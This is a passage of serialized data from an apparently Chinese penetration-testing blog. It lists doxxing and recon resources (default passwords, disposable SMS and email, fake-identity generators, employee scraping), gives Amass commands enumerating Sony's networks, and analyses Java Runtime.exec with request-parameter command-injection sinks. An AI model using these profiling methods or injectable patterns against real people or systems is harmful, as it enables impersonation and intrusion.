style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.opengps.cn/Default.aspx&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;默认密码&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://default-password.info/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://routerpasswords.com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;如需注册&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Sms&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.materialtools.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://receivefreesms.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Email&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://10minutemail.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://zh.mytrashmailer.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://24mail.chacuo.net/enus&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.linshiyouxiang.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Fake id&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.fakenamegenerator.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.haoweichi.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.fakeaddressgenerator.com/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;企业信息&lt;/p&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;天眼查、企查查、企业信用信息公示系统&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;企业邮箱收集，企业架构画像、人员统计、人员职责、部门、WiFi、常用部门密码、人员是否泄露过密码、人员平时爱逛的站点、OA/erp/crm/sso/mail/vpn等入口、网络安全设备（waf,ips,ids,router等统计）、内部使用的代码托管平台(gitlab、daocloud等)，bug管理平台、服务器域名资产统计&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;员工姓名&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;从LinkedIn中提取所有员工&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/ChrisAD/linkedin-employee-scraper&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;人肉搜索&quot;],&quot;text&quot;:[0,&quot;人肉搜索&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;人肉搜索&quot;],&quot;date&quot;:[3,&quot;2022-02-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/2&quot;]}]]],&quot;currentPostSlug&quot;:[0,&quot;penetration/google-hacking&quot;],&quot;prevPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/一些情报源&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 云信息\n```\nAliyun、AWS、GCP、Azure等\n查找可公开访问的实例\nhttps://github.com/gwen001/s3-buckets-finder\nhttps://github.com/nccgroup/aws-inventory\nhttps://github.com/jordanpotti/AWSBucketDump\n```\n# APP反编译\n```\nurl、js、osskey、api等信息查找\n搜集到接口Fuzz常见参数\n```\n# C段/B段信息\n```\nBanner、是否存在目标的后台或其他入口/其他业务系统\n```\n# 工具\n```\nrecon-ng,theharvester,maltego,exiftool等\nhttps://www.spiderfoot.net/\nhttps://github.com/smicallef/spiderfoot\n```\n# 网页缓存\n```\nhttp://www.cachedpages.com/\nhttps://archive.org/web\n```\n# 图片反查\n```\n百度识图、googleimage、tineye\n原图查询坐标\n```\n# Github/Gitee等代码托管平台\n```\nhttps://github.com/dxa4481/truffleHog\nhttps://github.com/lijiejie/GitHack\nhttps://github.com/MiSecurity/x-patrol\nhttps://github.com/az0ne/Github_Nuggests\nhttps://github.com/0xbug/Hawkeye\nhttps://github.com/mazen160/GithubCloner 克隆用户的github\nhttps://github.com/michenriksen/gitrob.git\n```\n# 被入侵网址列表\n```\nhttp://zone-h.org/archive\nwooyun镜像查找目标企业曾出现的漏洞\nhttp://wooyun.2xss.cc/\n```\n# Amass 深入的击面映射和资产发现\n```\nhttps://github.com/OWASP/Amass \n  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp; CIDR IP Range of a Company\n  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp; IP Address from ASN\n  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN \n  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang\n  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp; whois\n  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp; asn\n```\n# 威胁情报平台\n```\nVirustotal：https://www.virustotal.com/gui/home/upload\n腾讯哈勃分析系统：https://habo.qq.com/tool/index\n微步在线威胁情报：https://x.threatbook.cn/\n奇安信威胁情报：https://ti.qianxin.com/\n360威胁情报：https://ti.360.net/#/homepage\n安恒威胁情报：https://ti.dbappsecurity.com.cn/\n火线安全平台：https://www.huoxian.cn\nHacking8安全信息流：https://i.hacking8.com/\n零零信安：https://0.zone\n```&quot;],&quot;filePath&quot;:[0,&quot;source/posts/Penetration/一些情报源.md&quot;],&quot;digest&quot;:[0,&quot;ed23490867e26891&quot;],&quot;rendered&quot;:[0,{&quot;html&quot;:[0,&quot;&lt;h1 id=\&quot;云信息\&quot;&gt;云信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#云信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Aliyun、AWS、GCP、Azure等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;查找可公开访问的实例&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/gwen001/s3-buckets-finder&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/nccgroup/aws-inventory&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/jordanpotti/AWSBucketDump&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;app反编译\&quot;&gt;APP反编译&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#app反编译\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;url、js、osskey、api等信息查找&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;搜集到接口Fuzz常见参数&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;c段b段信息\&quot;&gt;C段/B段信息&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#c段b段信息\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Banner、是否存在目标的后台或其他入口/其他业务系统&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;工具\&quot;&gt;工具&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#工具\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;recon-ng,theharvester,maltego,exiftool等&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://www.spiderfoot.net/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/smicallef/spiderfoot&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;网页缓存\&quot;&gt;网页缓存&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#网页缓存\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://www.cachedpages.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://archive.org/web&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;图片反查\&quot;&gt;图片反查&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#图片反查\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;百度识图、googleimage、tineye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;原图查询坐标&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;githubgitee等代码托管平台\&quot;&gt;Github/Gitee等代码托管平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#githubgitee等代码托管平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/dxa4481/truffleHog&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/lijiejie/GitHack&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/MiSecurity/x-patrol&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/az0ne/Github_Nuggests&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/0xbug/Hawkeye&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/mazen160/GithubCloner 克隆用户的github&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/michenriksen/gitrob.git&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;被入侵网址列表\&quot;&gt;被入侵网址列表&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#被入侵网址列表\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://zone-h.org/archive&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;wooyun镜像查找目标企业曾出现的漏洞&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;http://wooyun.2xss.cc/&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;amass-深入的击面映射和资产发现\&quot;&gt;Amass 深入的击面映射和资产发现&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#amass-深入的击面映射和资产发现\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;https://github.com/OWASP/Amass &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -org &#39;Sony Corporation of America&#39;  #fetch ASN &amp;#x26; CIDR IP Range of a Company&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725 -ip   #enumerate subdomains &amp;#x26; IP Address from ASN&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -asn 3725    #enumerate subdomains only from ASN &lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -active -cidr 160.33.96.0/23   #enumerate subdomains from cidr rang&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass intel -asn 3725 -whois -d sony.com   #enumerate subdomains using asn &amp;#x26; whois&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;  &gt;amass enum -d sony.com -active -cidr 160.33.99.0/24,160.33.96.0/23 -asn 3725   #enumerate subdomains using cidr &amp;#x26; asn&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;\n&lt;h1 id=\&quot;威胁情报平台\&quot;&gt;威胁情报平台&lt;a class=\&quot;anchor-link\&quot; href=\&quot;#威胁情报平台\&quot;&gt;&lt;span class=\&quot;icon icon-link\&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/h1&gt;\n&lt;pre class=\&quot;astro-code astro-code-themes github-light github-dark\&quot; style=\&quot;background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;\&quot; tabindex=\&quot;0\&quot; data-language=\&quot;plaintext\&quot;&gt;&lt;code&gt;&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Virustotal：https://www.virustotal.com/gui/home/upload&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;腾讯哈勃分析系统：https://habo.qq.com/tool/index&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;微步在线威胁情报：https://x.threatbook.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;奇安信威胁情报：https://ti.qianxin.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;360威胁情报：https://ti.360.net/#/homepage&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;安恒威胁情报：https://ti.dbappsecurity.com.cn/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;火线安全平台：https://www.huoxian.cn&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;Hacking8安全信息流：https://i.hacking8.com/&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\&quot;line\&quot;&gt;&lt;span&gt;零零信安：https://0.zone&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&quot;],&quot;metadata&quot;:[0,{&quot;headings&quot;:[1,[[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;云信息&quot;],&quot;text&quot;:[0,&quot;云信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;app反编译&quot;],&quot;text&quot;:[0,&quot;APP反编译&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;c段b段信息&quot;],&quot;text&quot;:[0,&quot;C段/B段信息&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;工具&quot;],&quot;text&quot;:[0,&quot;工具&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;网页缓存&quot;],&quot;text&quot;:[0,&quot;网页缓存&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;图片反查&quot;],&quot;text&quot;:[0,&quot;图片反查&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;githubgitee等代码托管平台&quot;],&quot;text&quot;:[0,&quot;Github/Gitee等代码托管平台&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;被入侵网址列表&quot;],&quot;text&quot;:[0,&quot;被入侵网址列表&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;amass-深入的击面映射和资产发现&quot;],&quot;text&quot;:[0,&quot;Amass 深入的击面映射和资产发现&quot;]}],[0,{&quot;depth&quot;:[0,1],&quot;slug&quot;:[0,&quot;威胁情报平台&quot;],&quot;text&quot;:[0,&quot;威胁情报平台&quot;]}]]],&quot;localImagePaths&quot;:[1,[]],&quot;remoteImagePaths&quot;:[1,[]],&quot;frontmatter&quot;:[0,{&quot;title&quot;:[0,&quot;一些情报源&quot;],&quot;date&quot;:[3,&quot;2026-01-18T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;信息收集&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;imagePaths&quot;:[1,[]]}]}],&quot;collection&quot;:[0,&quot;blog&quot;]}],&quot;href&quot;:[0,&quot;/blog/post/18&quot;]}],&quot;nextPostItem&quot;:[0,{&quot;post&quot;:[0,{&quot;id&quot;:[0,&quot;penetration/java奇怪的命令执行&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;JAVA奇怪的命令执行&quot;],&quot;date&quot;:[3,&quot;2026-01-03T10:36:58.000Z&quot;],&quot;tags&quot;:[1,[[0,&quot;渗透&quot;],[0,&quot;java&quot;],[0,&quot;漏洞&quot;]]],&quot;categories&quot;:[0,&quot;Penetration&quot;]}],&quot;body&quot;:[0,&quot;# 前言\n首先Java下的命令执行大家都知道常见的两种方式：\n* 使用ProcessBuilder\n```\nProcessBuilder pb=new ProcessBuilder(cmd);\npb.start();\n```\n* 使用Runtime\n```\nRuntime.getRuntime().exec(cmd)\n```\n也就是说上面cmd参数可控的情况下，均存在命令执行的问题。但是话题回来，不太清楚大家是否遇到过java命令执行的时候，无论是windows还是linux环境下，带有|,&amp;lt;,&amp;gt;等符号的命令没办法正常执行。所以今天就进入底层看看这两个东西。\n\n# 差别\n先选择跟进\n```\nRuntime.getRuntime().exec(cmd)\n```\n样例代码如下所示：\n```java\nimport java.io.*;\n\npublic class Main {\n    public static void main(String[] arg) throws IOException {\n        String command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n        Process proc = Runtime.getRuntime().exec(command);\n        InputStream in = proc.getInputStream();\n        BufferedReader br = new BufferedReader(new InputStreamReader(in, \&quot;UTF8\&quot;));\n        String line = null;\n        while((line=br.readLine())!=null) {\n            System.out.println(line);\n        }\n    }\n}\n```\n跟进 java.lang.Runtime#exec 的构造方法，这里要感谢phith0n师傅提出的疑问，让我补充完整这篇文章，下面话题回来，exec的构造方法有以下几种情况，其实根据传入的变量我们大概可以区分的了，一个是根据String command，也就是直接传入一个字符串。另一个是根据String cmdarray\\[\\]，也就是传入一个数组。\n\n```java\npublic Process exec(String command) throws IOException {        \n    return exec(command, null, null);\n    }\npublic Process exec(String command, String[] envp) throws IOException {        \n    return exec(command, envp, null);\n    }\npublic Process exec(String cmdarray[]) throws IOException {\n        return exec(cmdarray, null, null);\n     }\npublic Process exec(String[] cmdarray, String[] envp) throws IOException {        \n    return exec(cmdarray, envp, null);\n        }\n```\n\n而根据前面代码中，我们传入的命令是如下所示：\n```\nString command=\&quot;/bin/sh -c echo 111 &gt; 3.txt\&quot;;\n```\n\n所以会进入\n```\nProcess exec(String command)\n```\n这个构造方法进行处理，跟进这个方法，发现最后返回\n```\nexec(command, null, null)\npublic Process exec(String command) throws IOException {        return exec(command, null, null);    }\n```\n继续跟进这个exec方法，看看这个方法的实现。这里代码实例化了StringTokenizer类，并且传入了我们要执行的command命令，简单翻译一下注释：为指定的字符串构造一个字符串标记器。也就是说StringTokenizer这个类会为特殊字符打上tag之类的东西。\n![](img/22.png)\n我们继续往下看，经过StringTokenizer类处理之后会返回一个cmdarray\\[\\]，而这里的处理实际上是根据空格针对命令进行了分割，至于为什么结果要是一个array数组，我们下面会接着说。\n\n![](img/23.png)\n我们发现经过一系列的处理，最后又有一个return exec 的处理。继续跟进这个exec的处理，我们可以看到这里最后实例化ProcessBuilder来处理我们传入的cmdarray。到这里实际上可以清楚了Runtime.getRuntime().exec()的底层实际上也是ProcessBuilder。\n```\npublic Process exec(String\\[\\] cmdarray, String\\[\\] envp, File dir)\n       throws IOException {\n       return new ProcessBuilder(cmdarray)\n          .environment(envp)\n           .directory(dir)\n           .start();\n   }\n```\n\n我们知道ProcessBuilder.start方法是命令执行，那么跟进这个start我们发现，首先prog获取cmdarray[0]也就是我们的/bin/sh，然后判断security是否为null，如果不为null就会校验checkExec。\n\n然后继续往下走，这里调用java.lang.ProcessImpl.start。\n\n进入之后我们就可以看到最后是调用java.lang.UnixProcess这个类来执行命令，而且我们发现执行命令的时候实际上是根据cmdarray[0]来判断用什么命令。而在java.lang.UnixProcess这个类里面是调用forkAndExec来为命令创建环境等操作。我们看到当前断点pid是2653，而这里确实起了一个sh的进程。\n\n这样看可能还不够明显，因为我们知道/bin/sh -c echo 111 &gt; 3.txt在bash命令行下也不会正常执行成功，命令行下需要/bin/sh -c \&quot;echo 111 &gt; 3.txt\&quot;，看这两段代码的命令执行的效果。\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;\n```\n首先先看\n`String command=\&quot;/bin/sh -c \\\\\&quot;echo 111 &gt; 3.txt\\\\\&quot;\&quot;;`\n按照前面的分析，经过StringTokenizer这个类进行拆分之后变成了{\&quot;/bin/sh\&quot;,\&quot;-c\&quot;,\&quot;\&quot;echo\&quot;,\&quot;111\&quot;、\&quot;&gt;\&quot;,\&quot;3.txt\&quot;\&quot;}。\n\n而当前内存开辟一个12473进程，并且确实12473执行sh命令。\n\n但是我们发现，经过StringTokenizer这类拆分之后，命令完全变了一个味道，语义完全变了，并不是我们想要的结果，那我们再看看\n```\nString\\[\\] command = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, \&quot;echo 111 &gt; 3.txt\&quot; };\n```\n的结果。因为我们传入的是array数组类型，这里直接将命令直接带入了ProcessBuilder进行处理，前面完全没有经过StringTokenizer这个类的拆分。也就是他完整的保存了我想要的语义。\n\n也就是说getRuntime().exec()如果直接传入字符串会经过StringTokenizer的分割，进而破坏其原本想要表达的意思。\n\n下面这段代码是否存在命令执行的问题，要是在PHP下，我会斩钉截铁的说是，但是回到java环境下，我们发现 | 等一些特殊符号没办法使用，而且传入的是字符串，遇到空格会被StringTokenizer进行切割，所以实际上下面这段代码是没办法使用的。\n```\nString str = request.getParameter(\&quot;url\&quot;);\nString cmdstr = \&quot;ping \&quot;+ url;Runtime.getRuntime().exec(cmdstr)\n```\n再来一段代码，能够执行命令，但是很受限，我们知道命令根据cmdarray[0]来确认以什么命令环境启动，这里确实以/bin/sh启动了，但是后面的命令执行的时候存在问题，它仅能执行单条命令，拼接不了相关参数。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString cmdstr = \&quot;/bin/sh -c \&quot;+ cmd;Runtime.getRuntime().exec(cmdstr)\n```\n最后再来一段代码，下面这段代码才会是java下命令执行的完全体。\n```\nString str = request.getParameter(\&quot;cmd\&quot;);\nString\\[\\] cmdstr = { \&quot;/bin/sh\&quot;, \&quot;-c\&quot;, str };Runtime.getRuntime().exec(cmdstr)\n```\n后面我翻到一篇文章，实际上也是差不多这个情况，实际上也是这个StringTokenizer这个类针对命令进行处理可能会造成非预期的结果。\n\n最后还有一个问题，为什么一定要将命令切割成为数组，原因是因为ProcessBuilder，看看他的构造方法。\n```\npublic ProcessBuilder(String... command) {        \n    this.command = new ArrayList&lt;&gt;(command.length);        \n    for (String arg : command)            \n    this.command.add(arg);\n   }\npublic ProcessBuilder(List&amp;lt;String&amp;gt; command) {\n    if (command == null)\n    throw new NullPointerException();\n    this.command = command;\n\n   